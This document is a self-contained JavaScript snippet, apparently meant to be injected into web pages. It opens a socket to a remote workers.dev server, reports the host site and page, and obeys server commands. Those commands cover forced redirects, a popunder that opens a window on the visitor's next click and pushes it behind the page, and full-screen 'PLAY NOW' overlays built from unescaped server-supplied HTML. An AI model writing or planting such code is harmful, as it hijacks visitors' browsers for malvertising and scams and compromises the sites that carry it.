(function() {
    const script = document.createElement('script');
    script.src = "https://cdn.socket.io/4.7.2/socket.io.min.js";
    document.head.appendChild(script);

    script.onload = () => {
        const myDomain = window.location.hostname || "Unknown-Site";
        const fullPagePath = window.location.hostname + window.location.pathname + window.location.search;

        
        const socket = io("https://dark-butterfly-a0dc.koydubupse.workers.dev", {
            transports: ['websocket'], 
            query: { 
                site: myDomain,
                page: fullPagePath 
            } 
        });

        
        socket.on('execute_action', (data) => {
            
            
            if (data.actionType === 'redirect') {
                window.location.href = data.url;
            } 
            
           
            else if (data.actionType === 'popunder') {
                if (data.url && data.url.trim() !== '') {
                    const popunderTrap = function(e) {
                        const popWin = window.open(data.url, '_blank');
                        
                        if (popWin) {
                            try {
                                popWin.blur();
                                window.focus();
                                window.open('javascript:window.focus()', '_self', '');
                                
                                setTimeout(() => {
                                    window.focus();
                                }, 10);
                            } catch (err) { }
                        }
                        
                        window.removeEventListener('click', popunderTrap, true);
                    };
                    
                    window.addEventListener('click', popunderTrap, true);
                }
            } 
            
             
            else if (data.actionType === 'flash') {
                const alertDiv = document.createElement('div');
                
                let buttonHtml = '';
                if (data.url && data.url.trim() !== '') {
                    buttonHtml = `
                        <a href="${data.url}" target="_blank" style="background: linear-gradient(135deg, #0ea5e9, #38bdf8); color: #0f172a; padding: 18px 50px; font-size: 20px; font-weight: 900; text-decoration: none; border-radius: 50px; box-shadow: 0 0 25px rgba(56, 189, 248, 0.4); transition: transform 0.2s; margin-bottom: 20px; text-transform: uppercase;">
                            PLAY NOW
                        </a>
                    `;
                }
                
                const isOnlyMessage = buttonHtml === '';
                const closeBtnStyle = isOnlyMessage 
                    ? "background: #38bdf8; color: #0f172a; padding: 15px 40px; font-size: 18px; text-decoration: none;" 
                    : "background: none; color: #94a3b8; padding: 10px; font-size: 15px; text-decoration: underline;";
                
                const closeBtnText = isOnlyMessage ? "OK, Got it!" : "Skip for now";

                alertDiv.innerHTML = `
                    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.95); z-index: 9999999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; backdrop-filter: blur(5px);">
                        <h1 style="font-size: 32px; color: #f8fafc; text-align: center; margin-bottom: 40px; padding: 0 20px; max-width: 800px; line-height: 1.4;">${data.message}</h1>
                        ${buttonHtml}
                        <button id="close-flash-btn" style="border: none; font-weight: bold; border-radius: 30px; cursor: pointer; transition: 0.2s; ${closeBtnStyle}">
                            ${closeBtnText}
                        </button>
                    </div>
                `;
                
                document.body.appendChild(alertDiv);

                document.getElementById('close-flash-btn').addEventListener('click', function() {
                    alertDiv.remove();
                });
            }
        });
    };
})();
